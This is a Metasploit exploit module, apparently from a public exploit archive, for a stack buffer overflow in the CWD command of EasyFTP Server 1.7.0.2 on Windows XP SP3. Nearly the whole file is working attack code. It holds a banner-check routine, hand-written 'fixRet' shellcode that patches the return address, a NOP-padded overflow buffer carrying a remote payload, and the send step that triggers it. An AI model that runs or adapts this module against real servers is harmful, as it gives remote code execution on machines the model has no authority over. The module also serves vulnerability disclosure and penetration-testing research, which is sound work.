# Exploit Title: EasyFTP Server <= 1.7.0.2 CWD Buffer Overflow (Metasploit)
# Date: April 19th, 2010
# Author: Paul Makowski (my.hndl@gmail.com || http://paulmakowski.wordpress.com)
# Software Link: http://easyftpsvr.googlecode.com/files/easyftpsvr-1.7.0.2.zip
# Version: EasyFTP Server <= 1.7.0.2
# Tested on: Windows XP SP3 English

# ways this could be improved:
# - write fixRet w/ metasm
# - use JMP ESP/EBPs for more targets

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Ftp
	
	$slack_space = 30
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'EasyFTP Server <= 1.7.0.2 CWD Command Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.2.
				EasyFTP fails to check input size when parsing 'CWD' commands, which allows for
				easy stack based buffer overflow exploitation.  EasyFTP allows anonymous access by
				default; valid credentials are typically unnecessary to exploit this vulnerability.
				
				Later versions may vulnerable, but have not been tested.
				
				This exploit utilizes a small piece of code that I've referred to as 'fixRet'.
				This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by
				'fixing' the return address post-exploitation.  See references for more information.
			},
			'Author'         => [ 'Paul Makowski <my.hndl [at] gmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/' ],
					[ 'URL', 'http://paulmakowski.wordpress.com/2010/04/19/metasploit-plugin-for-easyftp-server-exploit' ],
					[ 'URL', 'http://seclists.org/bugtraq/2010/Feb/202' ],
					[ 'URL', 'http://code.google.com/p/easyftpsvr/'],
					[ 'URL', 'https://tegosecurity.com/etc/return_overwrite/RCE_easy_ftp_server_1.7.0.2.zip' ],
					[ 'URL', 'http://www.securityfocus.com/bid/38262/exploit']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					# Total bytes able to write without crashing program (505) - length of fixRet (25) - slack space (30) = 450
					'Space'    => 505 - $slack_space - 25,
					'BadChars' => "\x00\x0a\x2f\x5c", # from: http://downloads.securityfocus.com/vulnerabilities/exploits/38262-1.py
				},
			'Platform'	 => 'win',
			'Targets'        => 
				[
					# This could be generalized, e.g. with a JMP ESP/EBP and then a short JMP @ ESP/EBP back to the beginning of the buffer
					[ 'Windows XP SP3 English',       { 'Ret' => 0x009AFD58 } ], # absolute addr, from Jon Butler's exploit
				],
			'DisclosureDate' => 'Feb 16 2010',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect	
		
		if (banner =~ /BigFoolCat/) # EasyFTP Server has undergone several name changes
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login
		
		# If the payload's length is larger than 233 bytes then the payload must be bisected with the return address and later patched.
		# Explanation of technique: http://paulmakowski.wordpress.com/2010/02/28/increasing-payload-size-w-return-address-overwrite/
		fixRet = ( # length = 25 bytes
			"\x31\xc0" +                	# xor    %eax,%eax
			"\x31\xdb" +                	# xor    %ebx,%ebx
			"\x31\xc9" +                	# xor    %ecx,%ecx
			"\xb8\xce\x54\x30\xaa" +       	# mov    $0xaa3054ce,%eax
			"\xbb\xaa\xaa\xaa\xaa" +       	# mov    $0xaaaaaaaa,%ebx
			"\x31\xd8" +                	# xor    %ebx,%eax (now %eax should hold 0x009AFE64)
			"\xb9" + 			# mov _____, %ecx
			payload.encoded[payload.encoded.length - 233 - 4, 4] +	# continuation of the above instruction; replace the 4 return address bytes with payload
			"\x89\x08" )                	# mov    %ecx,(%eax)
		
		print_status("Filling buffer with NOPs...")
		buf = make_nops(505)
		
		print_status("Prepending fixRet...")
		buf[0, fixRet.length] = fixRet
		
		print_status("Adding the payload...")
		buf[fixRet.length + $slack_space, payload.encoded.length] = payload.encoded # put payload in the buffer
		
		print_status("Overwriting part of the payload with target address...")
		buf[268, 4] = [ target.ret ].pack('V') # put return address @ 268 bytes
		
		print_status("Sending exploit buffer...")
		send_cmd( ['CWD', buf] , false) # this will automatically put a space between 'CWD' and our attack string
		
		handler
		disconnect
	end

end